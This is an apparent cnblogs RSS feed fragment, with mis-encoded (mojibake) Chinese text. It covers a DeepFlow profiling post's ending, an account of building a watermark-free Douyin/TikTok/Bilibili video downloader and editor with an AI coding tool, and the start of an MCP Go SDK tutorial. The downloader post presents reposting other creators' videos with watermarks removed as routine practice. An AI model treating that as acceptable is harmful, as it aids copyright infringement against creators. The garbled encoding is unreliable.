<td>å¶ä»ä»¥ <code>[</code> å¼å¤´</td>
</tr>
<tr>
<td>A</td>
<td>åºç¨å½æ°</td>
<td><code>*</code></td>
<td>é¤ä»¥ä¸ä¹å¤çå½æ°</td>
</tr>
</tbody>
</table>
</li>
<li>
<p>éè¿ API æ¥è¯¢æ°æ®</p>
<p>åè DeepFlow <a href="https://www.deepflow.io/docs/zh/features/continuous-profiling/data/#api" title="å®æ¹ææ¡£" target="_blank" rel="noopener nofollow">å®æ¹ææ¡£</a>ä¸­ API çä½¿ç¨æ¹å¼ã</p>
</li>
</ol>


</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-03 05:08">2026-02-03 05:07</span>&nbsp;
<a href="https://www.cnblogs.com/manuscript">æä¹è¿å¨åä»£ç </a>&nbsp;
éè¯»(<span id="post_view_count">20</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19565142);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19565142', targetLink: 'https://www.cnblogs.com/manuscript/p/19565142', title: 'éè¿ DeepFlow æ¥è¯¢å½æ°å¨ CPU ä¸æ¶èçæ¶é´ï¼CPU æ§è½åæï¼' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ ç»èå¨å¬å¼ï¼ææ¯å¦ä½ç¨ AI ä¸å¤©ä¸çº¿ä¸ä¸ªç½ç«ç ]]></title>
    <link>https://www.cnblogs.com/zh94/p/19566786</link>
    <guid>0d4f0b7ea7ef204f1341c1d2467aeb48</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/zh94/p/19566786" title="åå¸äº 2026-02-03 00:10">
    <span role="heading" aria-level="2">ç»èå¨å¬å¼ï¼ææ¯å¦ä½ç¨ AI ä¸å¤©ä¸çº¿ä¸ä¸ªç½ç«ç</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p>2026 å¹´åå¼å¹´ï¼Trae å°±ç»æ¯ä¸ªç¨æ·é½åäº 600 ç§¯åï¼è¿æ²¡é¢å°çæåï¼æç´§å» Trae.ai çå®ç½å¿«å¿«å»é¢åå§ããéå¹¿åï¼ç­å¿åä¸»ï¼çº¯æéð¶ã</p>
<p>é¢å°äº 600 ç§¯ååï¼å¤§æ¦ä¸ä¸ªæçæ¶é´å°±è¿æäºï¼æä»¥è¶çç§¯åè¿ç­ä¹ï¼å°±ç¨ Trae ç Gemini-3-Pro æ¨¡åå GPT-5.2 æ¨¡åç»èªå·±åäºä¸ä¸ªæ°çç½ç«ã</p>
<p>æ¥ä¸æ¥æä¼æç½ç«çå¼åç»èï¼ä»¥å UI æ¯å¦ä½è®¾è®¡å¦æ­¤ç²¾ç¾çï¼é½ç»å¤§å®¶åäº«åºæ¥ï¼ç¸ä¿¡å¯¹äºå¤§å¤æ°çè¯»èæ¥è¯´ï¼è¿å°æ¯ä¸ä¸ªéå¸¸ä¸éçç»éªåã</p>
<p>æç« å¿«ééè¯»åªéä¸¤åéï¼è¯»å®ä»¥åï¼ä½ çç»éªå¼å°±ä¼å¿«é +1 +1</p>
<h1 id="æç« å¼å§åä»ç»èæ¯">æç« å¼å§ï¼åä»ç»èæ¯</h1>
<p>åå å¤©è·ä¸ä¸ªæåèå¤©çæ¶åï¼èå°äºè§é¢åªè¾è¿ä¸ªé¢åï¼ä»ç°å¨å¨åçä¸å¡å°±æ¯å½åå¤åç§ç­å§åéåè§é¢æ¬è¿ã</p>
<p>åè§£éä¸ä¸ç­å§åéè¿ä¸ªæ¦å¿µï¼å¨å½åçå¹³å°ä¸ï¼æé³ãå¿«æãå¥½çè§é¢ãB ç«ç­ä¸çº¿å¹³å°ï¼é½ä¸çº¿çæç­å§åéçåè½ã</p>
<p>ç®åæ¥è¯´ï¼å°±æ¯ä½ æè¿ä¸ªç­å§çé«åæ¶å»åå¸å°ç­è§é¢å¹³å°ä¸ï¼ç¨æ·å¨çå°è¿ä¸ªè§é¢æ¿å¨ä¸å·²çæ¶åï¼å°±ä¼ç¹å»è´­ä¹°è§é¢å¨éï¼æ­¤æ¶ç¨æ·çè´­ä¹°è´¹ç¨ï¼å°±ä¼æ<br>
ä¸é¨åè½¬ç§»å°äºè¿ä¸ªè§é¢çä½èæä¸ã</p>
<p>æ³è¦åä¸ç­å§åéå°±å¿é¡»æ MCN çèµè´¨æè¡ï¼å¯¹äºå°åç MCN æºææ¥è¯´ï¼å¦ææ¯ä¸ä¸ªç­å§ä¸çº¿åï¼é½èªå·±ä¸ä¸ªä¸ä¸ªæ¥åªè¾é«åæ¶å»çå°è§é¢ï¼ææ¬æ¯ç¸å¯¹è¾é«çã</p>
<p>æä»¥ä»ä»¬ä¼æä¸ä¸ªæ®éçç©æ³ï¼å°±æ¯ç´æ¥ä¸è½½å«äººçè§é¢ï¼ç¶ååå¸å°èªå·±çè´¦å·ç©éµä¸ãä»èå¿«éè·åæµéï¼ç¶åè¿è¡çå©ã</p>
<p>ä¸¾ä¸ªä¾å­ï¼ä½ çå°æé³è¿ä¸ªç­å§å°è§é¢åªè¾çéå¸¸ä¸éï¼ç­åº¦ä¹å¾é«ï¼é£ä½ å°±ç´æ¥æè¯¥è§é¢ä¸è½½ä¸æ¥ãå»é¤æ°´å°åï¼æ·»å ä¸äºç¹æ®çå¨æï¼æ¹åè§é¢åæ¯ä¾ç­æä½ã</p>
<p>ç´æ¥åå¸å°èªå·±å¶ä»å¹³å°çè´¦ç©éµä¸å°±è¡ï¼ä»¥æ­¤æ¥è¿è¡çå©ã</p>
<p>è¿éæ¶åå°ä¸¤ä¸ªå¨ä½ï¼</p>
<p>ç¬¬ä¸ï¼ä½ å¦ä½å¨åä¸ªå¹³å°ä¸ä¸è½½ä¸ä¸ªæ æ°´å°ççåè§é¢ã</p>
<p>ç¬¬äºï¼è½å¦å°è¯¥åè§é¢æ¹åæ¯ä¾ï¼å¢å ç¹æè¿ä¸ªæä½ï¼ç´æ¥ AI ä¸é®å®æãèä¸æ¯è¿éè¦äººå·¥è¿è¡åä¸ã</p>
<p>äºæ¯ä¹ï¼æ¬æ¥Trae ç 600 ç§¯åå°æåï¼èªå·±æ­£æ³çå¦ä½æ¶èæå¢ï¼åè¿ä½æåèå®ï¼<strong>æå°±ç¨äºå¨æ«ä¸å¤©æ¶é´æè¿ä¸ªç½ç«ç» Vibe Coding åºæ¥äºã</strong></p>
<h1 id="åçç½ç«ææ">åçç½ç«ææ</h1>
<p>ä¸»è¦åä¸ºäºä¸ªæ¨¡åï¼</p>
<p>ä¸ï¼æé³æ æ°´å°è§é¢ä¸è½½</p>
<p><img src="https://img2024.cnblogs.com/blog/1104472/202602/1104472-20260202235426531-1053932813.png" alt="image" loading="lazy"></p>
<p>æä»¬ç´æ¥å°æé³é¾æ¥è¾å¥å°ç½ç«ä¸ï¼ç¶åç¹å»æ°çªå£æå¼è§é¢ï¼å³å¯ä¸è½½è¯¥è§é¢çæ æ°´å°çæ¬ã</p>
<p><img src="https://img2024.cnblogs.com/blog/1104472/202602/1104472-20260202235441498-332666344.png" alt="image" loading="lazy"></p>
<p>äºï¼TikTokæ æ°´å°è§é¢ä¸è½½</p>
<p><img src="https://img2024.cnblogs.com/blog/1104472/202602/1104472-20260202235448344-1577323153.png" alt="image" loading="lazy"></p>
<p>ä¸ï¼B ç«æ æ°´å°è§é¢ä¸è½½</p>
<p><img src="https://img2024.cnblogs.com/blog/1104472/202602/1104472-20260202235454663-1817359072.png" alt="image" loading="lazy"></p>
<p>åï¼ <strong>AI æºè½ä¿®åªï¼å¯ä»¥ä¸é®å°ä½ æä¸ä¼ çè§é¢ï¼ç´æ¥è¿è¡æºè½è£åªï¼</strong></p>
<p><img src="https://img2024.cnblogs.com/blog/1104472/202602/1104472-20260202235501394-242268660.png" alt="image" loading="lazy"></p>
<p>ç®åæ¯æç´æ¥ééè§é¢æ¯ä¾ï¼ä»¥åè²å½©å¢å¼ºï¼æºè½å»åªï¼åé³é¢å¾®è°åè½</p>
<p><img src="https://img2024.cnblogs.com/blog/1104472/202602/1104472-20260202235511484-994071418.png" alt="image" loading="lazy"></p>
<h1 id="æ¥ä¸æ¥æä»¬å¼å§æ­£å¼æè§£">æ¥ä¸æ¥æä»¬å¼å§æ­£å¼æè§£</h1>
<p>é¦åï¼å¿é¡»çå¿çå°±æ¯ï¼è®¡ååè¡ï¼åä¸ä¸è¦ç´æ¥è®©AIç´æ¥ç»ä½ å¹²ä»£ç ï¼</p>
<p>åè®°ï¼å¯¹äºè¿äºé¡¶å°æ¨¡åï¼åä»£ç å¯¹ä¸ä»æ¥è¯´é½æ¯æç®åçäºæï¼ä½æ¯ä¸æ¦è®¡åæ²¡å¯¹åºèµ·æ¥ï¼ä»£ç åé¢ç»ä½ åç³ç³äºï¼ä½ åé¢åè®©ä»æ¥æ¥ååä¿®æ¹ï¼æ¯éå¸¸çæµªè´¹æ¶é´çã</p>
<p>æä»¥ï¼ä¸å®è¦è®¡ååè¡ï¼</p>
<p>æä»¬åæä¸é¢æ³è¦å®ç°çè¿äºåæ­¥éæ±ï¼ç´æ¥ç¨ Solo Code ç Plan æ¨¡å¼ï¼å¨é¨ä¸¢ç» AIï¼è®©ä»ç½åä¸ä¸ªå®ç°è®¡åã</p>
<p>æ ¸å¿æ­¥éª¤æ¯ï¼</p>
<p>ä¸ï¼è®©ä»èªè¡è°ç å¦ä½å®ç°æé³ãTikTokãB ç«è¿ä¸ä¸ªå¹³å°çè§é¢ä¸è½½æ æ°´å°åè½ãå¹¶è®©ä»è¾åºææ¯ææ¡£ã</p>
<p>äºï¼è®©ä»è°ç å¦ä½å®ç°ç½ç«å¨çº¿çè§é¢åªè¾åè½ãå¹¶è®©ä»è¾åºææ¯ææ¡£ã</p>
<p>ä¸ï¼è®©ä»èªè¡åä¸ä¸ªç½ç«çåè½åè¡¨ï¼å®ç°æä»¬æ³è¦çéæ±ï¼éè¦æåªäºèåååè½ï¼å¹¶è®©ä»è¾åºä¸ä¸ªè®¾è®¡ææ¡£ã</p>
<p>åï¼è®©ä»å¶å®æµè¯è®¡åï¼è¿éæä»¬èªè¡æ¾å°ä¸ä¸ªæé³çè§é¢é¾æ¥ãTikTok çè§é¢é¾æ¥ï¼B ç«çè§é¢é¾æ¥ï¼ä½ä¸ºä»çæµè¯ç¨ä¾ï¼è®©ä»åç»­å¼åå®æåè½åï¼èªè¡åºäºè¯¥æµè¯ç¨ä¾ï¼è¿è¡æµè¯ã</p>
<p>è¿åä¸ªäºé¡¹çææ¡£ç¡®è®¤å®ä»¥åï¼å¶å®å·²ç»å¯ä»¥è®©ä»å®ç°èªé­ç¯äºï¼èªå·±å¼ååè½èªå·±è¿è¡æµè¯ã</p>
<p>è¿éæä¸ä¸ªæ³¨æäºé¡¹æ¯ï¼Solo Code æ¨¡å¼æ¯æ Sub Agentï¼æä»¬è¿éç´æ¥æ Trae å®ç½æ¨èçä¸äº Agent å¨é¨ç»å å°èªå·±çæ¨¡åå½ä¸­ï¼è¿æ · Solo Code ä¼å¨éè¦çæ¶åèªä¸»è°ç¨æ¶æ Agentãåç«¯ UI Agent ç­åç§ Agent çè½åã</p>
<p><img src="https://img2024.cnblogs.com/blog/1104472/202602/1104472-20260202235520646-1771038128.png" alt="image" loading="lazy"></p>
<p>ç­å°ææ¯ææ¡£ç¡®è®¤åï¼æä»¬äººå·¥ç®åå®¡æ ¸ä¸ææ¡£ï¼å¶å®åç«¯æä¹çä¸æï¼åªæ¯å¤§æ¦çä¸ä¸ï¼ä»è¦ä½¿ç¨çå¼åè¯­è¨ä»¥åè¦éç¨çæ¡æ¶æ¯ä¸æ¯ä½ æ³è®©ä»ä½¿ç¨çå³å¯ã</p>
<p>è¿éä¸»è¦æ¯è®©ä»ä½¿ç¨ React æ¡æ¶ï¼æ¹ä¾¿åç»­é¨ç½²å° vercel ä¸ï¼å¶ä»çææ²¡å¥ç¹æ®è¦æ±ã</p>
<p>ç±äºæå¼å§ï¼æä¹ä¸ç¥éç½ç«å°åºè¦è®¾è®¡æå¥æ ·å­ï¼æä»¥çäºç AI ç»çè®¾è®¡ææ¡£ï¼æè§åè½è¯¥æçé½æï¼äºæ¯å¨é¨å®¡æ ¸éè¿åã</p>
<p>å¼å§è®© AI æ­£å¼åå§åé¡¹ç®å¹¶ç¼åä»£ç ãè¿ä¸ªæ¶åå©ä¸çå°±æ¯ç­å¾ä»èªå·±å¹²æ´»äºã</p>
<hr>
<p>ç­å° AI å¨é¨åå®ä»£ç ï¼éªè¯å®æµè¯ç¨ä¾åï¼å¤§æ¦çéè¦èæ¶ 1 - 2 ä¸ªå°æ¶å·¦å³ï¼åå æ¯å ä¸ºè¿ä¸­é´ä¼å­å¨ AI èªè¡éªè¯å®æï¼ä½æ¯ä½ äººå·¥è¿è¡éªè¯çæ¶åä»ç¶ä¼çå°å¼å¸¸çæåµï¼è¿ä¸ªæ¶åå°±éè¦ä½ äººå·¥è¿è¡ä»å¥ï¼ç¶ååå¤å AI è¿è¡åè½è°è¯ï¼ç´å°ä½ äººå·¥éªè¯éè¿ã</p>
<p>æä»¬æ­¤æ¶çä¸ä¸ AI ç¬¬ä¸çæ¬å¼ååºçåè½ï¼</p>
<p><img src="https://img2024.cnblogs.com/blog/1104472/202602/1104472-20260202235530128-640288049.png" alt="image" loading="lazy"></p>
<p>è¾å¥ä¸ä¸ªæé³é¾æ¥ï¼éªè¯ä¸ä¸è§£æåè§é¢æ¯å¦æåï¼å¯ä»¥çå°åè½å®ç°æ¯æ²¡æé®é¢çã</p>
<p><img src="https://img2024.cnblogs.com/blog/1104472/202602/1104472-20260202235537294-2029920119.png" alt="image" loading="lazy"></p>
<p>ä½æ¯å¯ä¸çé®é¢æ¯ä»ä¹å¢ï¼UI çé¢å¤ªä¸äºã</p>
<p>UI é®é¢å®éæ¯æç®åçé®é¢ï¼å ä¸ºç°æçç½é¡µè®¾è®¡ï¼å­å¨å¾å¤ä¸åçè®¾è®¡è¯­è¨ï¼</p>
<ol>
<li>
<p>ææºç®çº¦ä¸»ä¹ (Organic Minimalism)</p>
</li>
<li>
<p>çå£«è®¾è®¡é£æ ¼ (Swiss / International Typographic Style)</p>
</li>
<li>
<p>éå½æ´¾(Brutalism) è®¾è®¡è¯­è¨ç­ç­</p>
</li>
</ol>
<p>ä¸åçè®¾è®¡è¯­è¨ï¼èåé½æä¸å¥ UI æ¡æ¶æä¾æ¯æï¼ä½ éè¦æèªå·±æ³è¦ä»ä¹é£æ ¼çç½é¡µç» AI è¯´æ¸æ¥ï¼ä»å°±ä¼èªè¡æç§è¿å¥è®¾è®¡æ¡æ¶æ¥éæä½ ç UI é£æ ¼ã</p>
<p>è¿éå¨éªè¯å® AI åè½å¯è¡åï¼æå°±ç´æ¥è®© AI åºäºéå½æ´¾(Brutalism) è®¾è®¡è¯­è¨ï¼æ¥éæ°è®¾è®¡ä¸ä¸ UI çé¢ã</p>
<p>åï¼è®¾è®¡å®ä¹åçææå°±å¦ä¸æç¤ºäºï¼</p>
<p><img src="https://img2024.cnblogs.com/blog/1104472/202602/1104472-20260202235548988-1715650455.png" alt="image" loading="lazy"></p>
<p>ç´§æ¥çèæ¶çé¨åå°±æ¯é¡¹ç®çç»èä¼åé¨åäºï¼</p>
<p>ä¸ï¼è®© AI å¢å ä¸­è±æåæ¢çåè½ï¼å¨ç«ææåå®¹åæ¯æä¸­è±æåæ¢ã</p>
<p>äºï¼è®© AI å¢å æç¨è¯´æææ¡£ï¼éå¯¹ä¸åæ¨¡åçåè½ï¼åå«åä¸ä¸ªä½¿ç¨æç¨ã</p>
<p>æ¯å¦éå¯¹ TikTok æ æ°´å°è§é¢ä¸è½½çæç¨ï¼è¿é AI ç½åå®ä½¿ç¨æç¨åï¼ä¼æå®ä¸ä¸ªæä»¶å¤¹ï¼<br>
æä»¬éè¦æå¯¹åºçä¸äºç´ æç§çæ¾å°å¯¹åºçæä»¶å¤¹ä¸ãæ¯å¦ä¸é¢çTikTok çé¡µé¢æªå¾ï¼å°±éè¦äººå·¥æªå¾å¹¶æ¾å°å¯¹åºçç®å½ä¸ã</p>
<p><img src="https://img2024.cnblogs.com/blog/1104472/202602/1104472-20260202235555406-124676729.png" alt="image" loading="lazy"></p>
<p>å°äºè¿ä¸æ­¥åå¢ï¼å¶å®æ´ä¸ªç½ç«çåè½å·²ç»å¼åçå·®ä¸å¤äºã</p>
<p>æ¥ä¸æ¥æä¼ååç¬æ°å¼ä¸ä¸ªçªå£ï¼è®© Gemini éæ°æ«æé¡¹ç®ä»£ç ï¼å¸®æç¡®è®¤å½åçå®ç°æ¯å¦ç¬¦åï¼</p>
<p>ä¸ï¼ç¡®è®¤æé³ãTikTokãB ç«è¿ä¸ä¸ªå¹³å°çè§é¢ä¸è½½åè½ï¼å¨é¨æ¯è¿è¡å¨æµè§å¨çç¯å¢å½ä¸­ï¼ä¸è¦å¼ºä¾èµæå¡ç«¯èµæºã</p>
<p>äºï¼ç¡®è®¤ AI æºè½ä¿®åªåè½ï¼æ¯è¿è¡å¨æµè§å¨çç¯å¢å½ä¸­ï¼ä¸è¦å¼ºä¾èµæå¡ç«¯èµæºã</p>
<p>è¿éæ¶åå°ä¸ä¸ªé®é¢æ¯ï¼å¦æè§£æå®æé³è§é¢è¿è¡ä¸è½½æ¶ï¼è¿éè¦è¯·æ±èªå·±çç½ç«æå¡å¨ä¸è½½è§é¢ï¼é£å¯¹äºç½ç«çæµéæ¶èå½±åå¤ªå¤§äºã</p>
<p>ä»¥å AI æºè½ä¿®åªåè½ä¹æ¯ä¸æ ·ï¼å¦æè¿éè¦è§é¢ä¸ä¼ å°äºç«¯åè¿è¡åªè¾ï¼ææ¬å¤ªé«äºï¼æå¡å¨æ¯æä¸ä½çã</p>
<p>æä»¥æ°å¼ä¸ä¸ªçªå£ï¼è®© Gemini éæ°æ«æé¡¹ç®ä»£ç ï¼ç¡®è®¤æ¯å¦ç¬¦åä¸è¿°è¦æ±ï¼ç­å°ä¸åé½ç¡®è®¤å®æåï¼å°±å¯ä»¥ç´æ¥ä½¿ç¨ Solo çBuilder æ¨¡å¼ï¼ç´æ¥å°ç½ç«é¨ç½²å° vercel ä¸äºã</p>
<p>ä¸åå°±è¿ä¹æå¿«çç»æå¦ï¼</p>
<p>æ³è¦ä½éªè¿ä¸ªç½ç«çæåï¼å¯ä»¥ç´æ¥æµè§å¨è®¿é®ï¼<a href="https://www.neirongshu.com" target="_blank" rel="noopener nofollow">https://www.neirongshu.com</a></p>
<h1 id="æ¬¢è¿æ¥å¸¸äº¤æµ">æ¬¢è¿æ¥å¸¸äº¤æµ</h1>
<p>AI é©±å¨å¢éå¼åæ¯è¿ä¸ªæ¶ä»£çæ°å½é¢ï¼æ¬¢è¿å¤§å®¶å å¾®ä¿¡äºç¸äº¤æµå¿å¾ã</p>
<p>ð æ³è¦è¿ç¾¤çæåï¼æ«ç æ¶å¤æ³¨ âAIå®éªç¾¤âï¼çå°æ¶æ¯åä¼ç¬¬ä¸æ¶é´æä½ è¿ç¾¤ã</p>
<p>ç¾¤å®ä½ï¼AIå·¥å·ææ/å®æç»éªäºå©</p>
<p>ç¾¤è§åï¼ä¸æ°´ç¾¤ãä¸å¹¿åãå¹²è´§ä¼å</p>
<p>æ¬¢è¿è®¿é®è¯¥é¾æ¥è·åç¾¤ä¿¡æ¯ï¼<a href="https://zhaozhihao.com/archives/KRMxDLo4" target="_blank" rel="noopener nofollow">https://zhaozhihao.com/archives/KRMxDLo4</a></p>
<p>å¥½æç« å¼å¾è¢«æ´å¤äººçè§ï¼æ¢ç¶çå°è¿éäºï¼éæç¹ä¸ªèµðåå³æ³¨ï¼å¹¶è½¬åç»æ´å¤çæåå§ï¼æè°¢ã</p>
<p>ä½èï¼è´¾åæ¯çå¹³è¡ä¸çãVï¼x_h886688</p>
<hr>
<p><a href="https://mp.weixin.qq.com/s/WRFVYF467ItBgL9uiA4jcQ" target="_blank" rel="noopener nofollow">åæå°åï¼ç»èå¨å¬å¼ï¼ææ¯å¦ä½ç¨ AI ä¸å¤©ä¸çº¿ä¸ä¸ªç½ç«ç</a></p>


</div>
<div id="MySignature" role="contentinfo">
    <br>
<fieldset style="padding: 10px; margin: 10px; background-color: #fff; width: 850px; border: 1px solid black; font-size: blod">
<p><span style="color: black">çæå£°æ</span></p>
<hr style="color: black">
<p><span style="color: black">ä½èï¼éå¬é</span></p>
<p><span style="color: black">åºå¤ï¼</span><a style="color: black" href="https://www.cnblogs.com/zh94/" target="_blank">éå¬éçææ¯åå®¢--https://www.cnblogs.com/zh94/</a></p>
<p><span style="color: black">æ¨çæ¯ææ¯å¯¹åä¸»æå¤§çé¼å±ï¼æè°¢æ¨çè®¤çéè¯»ã</span></p>
<p><span style="color: black">æ¬æçæå½ä½èææï¼æ¬¢è¿è½¬è½½ï¼ä½æªç»ä½èåæå¿é¡»ä¿çæ­¤æ®µå£°æï¼ä¸å¨æç« é¡µé¢ææ¾ä½ç½®ç»åºåæè¿æ¥ï¼å¦åä¿çä»»ä½è¿½ç©¶æ³å¾è´£ä»»çæå©ã</span></p>
</fieldset>

<div style="padding: 10px; margin: 10px; background-color: #fff; width: 850px; border: 0px solid black; font-size: blod">
     <img src="https://images.cnblogs.com/cnblogs_com/zh94/1586631/o_211225012748_weixin_saoma.png">&nbsp;&nbsp;&nbsp;&nbsp;<img src="https://images.cnblogs.com/cnblogs_com/zh94/1586631/o_211225012748_weixin_saoma.png">
</div>
</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.003472222222222222" data-date-updated="2026-02-03 00:15">2026-02-03 00:10</span>&nbsp;
<a href="https://www.cnblogs.com/zh94">è´¾åæ¯çå¹³è¡ä¸ç</a>&nbsp;
éè¯»(<span id="post_view_count">133</span>)&nbsp;
è¯è®º(<span id="post_comment_count">1</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19566786);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19566786', targetLink: 'https://www.cnblogs.com/zh94/p/19566786', title: 'ç»èå¨å¬å¼ï¼ææ¯å¦ä½ç¨ AI ä¸å¤©ä¸çº¿ä¸ä¸ªç½ç«ç' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ MCPå®æ¹Go SDKå°é² ]]></title>
    <link>https://www.cnblogs.com/XY-Heruo/p/19566770</link>
    <guid>b41925afec04902935cbbe51838485d0</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/XY-Heruo/p/19566770" title="åå¸äº 2026-02-03 00:02">
    <span role="heading" aria-level="2">MCPå®æ¹Go SDKå°é²</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                    <div id="cnblogs_post_description" style="display: none">
        
        MCPå®æ¹Go SDKä¸æä½éªï¼å¼åä¸ä¸ªç®åçMCP ServeråMCP Client
    </div>
<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h2 id="åè¨">åè¨</h2>
<p>æ­¤åå¨ MCP å®ç½å°±æ³¨æå°å®æ¹æä¾äº Go SDKï¼è¿æç±äºå¨ Python ç¯å¢ä¸å¼å MCP Server æç¹"å®¡ç¾ç²å³"ï¼å æ­¤å³å®ä½¿ç¨ Go è¯­è¨å°å°é²ã</p>
<p>ä»ä¸ªäººå®éä½éªæ¥çï¼Go è¯­è¨å¨å¹¶åå¤çæ¹é¢ç¡®å®å·ææ¾èä¼å¿ï¼æ éçº ç»äºåæ­¥é»å¡ãå¼æ­¥äºä»¶å¾ªç¯ãå¤è¿ç¨å¤çº¿ç¨éä¿¡ç­å¤æçå¹¶åé®é¢ï¼goroutine ä¸ææ¢­åãåæ¶ï¼Go è¯­è¨çé¨ç½²ä¹éå¸¸ä¾¿æ·ï¼ç¼è¯åçæçéæäºè¿å¶æä»¶å·æè¯å¥½çå¯ç§»æ¤æ§ï¼å¯ä»¥å¨ä¸åç¯å¢ä¸­ç´æ¥è¿è¡ã</p>
<p>ç¶èï¼è¿ç§ä¾¿å©æ§ä¹ä¼´éçä¸å®çä»£ä»·ãç¸è¾äº Pythonï¼ä½¿ç¨ Go è¯­è¨å®ç° MCP åè½ç¸å¯¹å¤æä¸äºï¼å¼åæçç¥ä½ãè¿å°±æ¯è½¯ä»¶å·¥ç¨ä¸­çç»å¸æè¡¡äºï¼è¿è¡ææ¬ä¸å¼åææ¬å¾å¾é¾ä»¥å¼å¾ï¼éè¦æ ¹æ®å·ä½åºæ¯è¿è¡åèã</p>
<h2 id="mcp-åè®®ç®ä»">MCP åè®®ç®ä»</h2>
<p><em>å¯è½é½è³çè½è¯¦äºï¼ä½ä»¥é²è¿æä¸çæçæåï¼åç®åä»ç»ä¸MCP</em></p>
<p>Model Context Protocol (MCP) æ¯ä¸ç§æ ååçåè®®ï¼æ¨å¨ä¸º AI æ¨¡åæä¾ç»ä¸çå·¥å·è°ç¨æ¥å£ãéè¿ MCPï¼å¼åèå¯ä»¥å°åç§å·¥å·ãæå¡åæ°æ®æºæ´é²ç» AI æ¨¡åï¼ä½¿å¶è½å¤æ§è¡è¶åºåºç¡è¯­è¨æ¨¡åè½åèå´çæä½ãMCP æ¯æå¤ç§ä¼ è¾åè®®ï¼åæ¬ HTTP å Stdioï¼ä¸ºä¸ååºæ¯ä¸çéææä¾äºçµæ´»æ§ã</p>
<h2 id="ä¸ä¸ªç®åç-mcp-server-ç¤ºä¾">ä¸ä¸ªç®åç MCP Server ç¤ºä¾</h2>
<p>MCP å®æ¹ Go SDK å¨å®ä¹å·¥å·ï¼Toolï¼æ¶ï¼è¦æ±æç¡®æå®è¾å¥åæ°åè¾åºç»æçæ°æ®ç»æãå¯¹äºåè½è¾ä¸ºç®åçå·¥å·ï¼ä¹å¯ä»¥ç´æ¥ä½¿ç¨ <code>any</code> ç±»åãä»¥ä¸æ¯ä¸ä¸ªå®æ´ç MCP Server ç¤ºä¾ï¼æä¾äºä¸ä¸ªå®ç¨å·¥å·ï¼</p>
<ol>
<li>
<p><strong><code>getCurrentDatetime</code></strong>ï¼è·åå½åæ¶é´ï¼è¿å RFC3339 æ ¼å¼ï¼<code>2006-01-02T15:04:05Z07:00</code>ï¼çæ¶é´æ³å­ç¬¦ä¸²ãç±äºä¸éè¦è¾å¥åæ°ï¼å æ­¤åæ°ç±»åå®ä¹ä¸º <code>any</code>ï¼è¾åºåæ ·ä½¿ç¨ <code>any</code> ç±»åã</p>
</li>
<li>
<p><strong><code>getComputerStatus</code></strong>ï¼è·åå½åç³»ç»çå³é®ä¿¡æ¯ï¼åæ¬ CPU ä½¿ç¨çãåå­ä½¿ç¨æåµãç³»ç»çæ¬ç­ãè¯¥å·¥å·æ¥åä¸ä¸ª <code>CPUSampleTime</code> åæ°ï¼å¯¹åºçè¾å¥ç»æä½ä¸º <code>GetComputerStatusIn</code>ï¼è¾åºç»æä½ä¸º <code>GetComputerStatusOut</code>ï¼Go SDK çç¤ºä¾ä¸­éå¸¸éç¨ <code>xxxIn</code> å <code>xxxOut</code> çå½åçº¦å®æ¥åºåå·¥å·çè¾å¥è¾åºç»æä½ï¼ã</p>
</li>
<li>
<p><strong><code>getDiskInfo</code></strong>ï¼è·åææç¡¬çååºçä½¿ç¨ä¿¡æ¯åæä»¶ç³»ç»è¯¦æãè¯¥å·¥å·æ éè¾å¥åæ°ï¼ä»å®ä¹äºè¾åºç»æä½ <code>GetDiskInfoOut</code>ã</p>
</li>
</ol>
<p>å¨å®æææå·¥å·é»è¾çå®ç°åï¼æåä¸æ­¥æ¯å¯å¨æå¡ãä»¥ä¸ç¤ºä¾éç¨ Streamable HTTP æ¨¡å¼å¯å¨ï¼åæ¶ä¹ä¿çäº Stdio Transport æ¨¡å¼çæ³¨éä»£ç ä¾åèã</p>
<pre><code class="language-go">package main

import (
	"context"
	"fmt"
	"log"
	"net"
	"net/http"
	"time"

	"github.com/modelcontextprotocol/go-sdk/mcp"
	"github.com/shirou/gopsutil/v4/cpu"
	"github.com/shirou/gopsutil/v4/disk"
	"github.com/shirou/gopsutil/v4/host"
	"github.com/shirou/gopsutil/v4/mem"
)

func getCurrentDatetime(ctx context.Context, req *mcp.CallToolRequest, arg any) (*mcp.CallToolResult, any, error) {
	now := time.Now().Format(time.RFC3339)
	return nil, now, nil
}

type GetComputerStatusIn struct {
	CPUSampleTime time.Duration `json:"cpu_sample_time" jsonschema:"the sample time of cpu usage. Default is 1s"`
}

type GetComputerStatusOut struct {
	Hostinfo    string `json:"host info" jsonschema:"the hostinfo of the computer"`
	TimeZone    string `json:"time_zone" jsonschema:"the time zone of the computer"`
	IPAddress   string `json:"ip_address" jsonschema:"the ip address of the computer"`
	CPUUsage    string `json:"cpu_usage" jsonschema:"the cpu usage of the computer"`
	MemoryUsage string `json:"memory_usage" jsonschema:"the memory usage of the computer"`
}

func getComputerStatus(ctx context.Context, req *mcp.CallToolRequest, args GetComputerStatusIn) (*mcp.CallToolResult, GetComputerStatusOut, error) {
	if args.CPUSampleTime == 0 {
		args.CPUSampleTime = time.Second
	}
	hInfo, err := host.Info()
	if err != nil {
		return nil, GetComputerStatusOut{}, err
	}

	var resp GetComputerStatusOut
